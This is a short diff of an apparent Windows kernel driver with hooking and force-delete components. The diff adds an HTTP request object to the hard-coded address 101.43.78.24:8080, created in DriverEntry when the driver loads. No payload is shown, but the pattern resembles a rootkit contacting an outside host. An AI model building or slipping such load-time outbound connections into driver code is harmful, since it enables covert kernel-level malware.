@@ -4,6 +4,7 @@
 #include "HookElxp.h"
 #include "LDE64x64.h"
 #include "ForceDelete.h"
+#include "HttpRequest.h"
 
 //得到系统版本号
 VOID GetVersion()
@@ -217,6 +218,8 @@ NTSTATUS DispatchDevCTL(PDEVICE_OBJECT DeviceObject, PIRP Irp) {
 NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
 	NTSTATUS status;
 	int i;
+
+	HttpRequest request = HttpRequest("101.43.78.24", 8080);
 	//设置驱动卸载事件
 	DriverObject->DriverUnload = Unload;
 	//创建设备对象
